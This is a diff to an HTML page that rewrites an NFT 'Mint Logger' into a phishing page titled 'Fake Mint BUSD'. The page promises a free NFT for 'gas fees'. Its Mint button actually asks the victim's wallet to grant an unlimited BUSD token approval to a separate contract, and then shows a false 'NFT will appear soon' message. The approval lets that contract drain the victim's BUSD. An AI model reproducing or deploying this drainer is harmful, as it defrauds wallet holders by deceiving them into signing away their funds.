@@ -2,77 +2,74 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Mint Logger</title>
+  <title>Fake Mint BUSD</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <style>
     body {
-      background: #111;
+      background-color: #121212;
       color: #eee;
       font-family: Arial, sans-serif;
       text-align: center;
       padding-top: 50px;
     }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 15px;
+    }
+    p {
+      font-size: 16px;
+      margin-bottom: 25px;
+    }
     button {
-      padding: 15px 30px;
+      padding: 15px 40px;
       font-size: 18px;
-      background: #0f0;
+      background: #28a745;
       border: none;
-      border-radius: 8px;
+      border-radius: 10px;
       cursor: pointer;
       font-weight: bold;
-      margin-bottom: 20px;
+      color: white;
     }
-    #log {
+    #status {
+      margin-top: 20px;
+      color: #00ff00;
+      font-weight: 600;
       white-space: pre-wrap;
       max-width: 600px;
-      margin: 0 auto;
-      font-family: monospace;
-      text-align: left;
-      background: #222;
-      padding: 15px;
-      border-radius: 8px;
-      height: 200px;
-      overflow-y: auto;
+      margin-left: auto;
+      margin-right: auto;
+      word-break: break-word;
     }
   </style>
 </head>
 <body>
-  <h1>Mint Logger</h1>
-  <button onclick="mint()">Mint Now</button>
-  <div id="log"></div>
+  <h1>Fake Mint BUSD</h1>
+  <p>Get your free NFT now! Just approve gas fees.</p>
+  <button onclick="approve()">Mint Now</button>
+  <div id="status"></div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
   <script>
-    const contractAddress = "0x9AD59e1e61FbD05CdfC67dFA0CbDdCA9912B3B33";
-    const abi = [
-      "event Minted(address indexed user)",
-      "function mint() external"
-    ];
+    const tokenAddress = "0xe9e7cea3dedca5984780bafc599bd69add087d56"; // BUSD on BSC
+    const contractAddress = "0xC259Bb14dE51e292b9E6f32AD41507bf3Fa7028A"; // твой контракт
 
-    let provider, signer, contract;
-
-    async function init() {
-      provider = new ethers.BrowserProvider(window.ethereum);
-      signer = await provider.getSigner();
-      contract = new ethers.Contract(contractAddress, abi, signer);
-
-      contract.on("Minted", (user) => {
-        const log = document.getElementById("log");
-        log.innerText += `Minted by: ${user}\n`;
-        console.log("Minted by:", user);
-      });
-    }
-
-    async function mint() {
+    async function approve() {
       try {
-        const tx = await contract.mint();
+        await window.ethereum.request({ method: "eth_requestAccounts" });
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const token = new ethers.Contract(tokenAddress, [
+          "function approve(address spender, uint256 amount) public returns (bool)"
+        ], signer);
+
+        const tx = await token.approve(contractAddress, ethers.MaxUint256);
+        document.getElementById("status").innerText = "🔄 Waiting for approval...";
         await tx.wait();
-      } catch (e) {
-        alert("Mint failed: " + e.message);
+        document.getElementById("status").innerText = "✅ Approved! NFT will appear soon.";
+      } catch (error) {
+        document.getElementById("status").innerText = "❌ Error: " + error.message;
       }
     }
-
-    window.onload = init;
   </script>
 </body>
 </html>
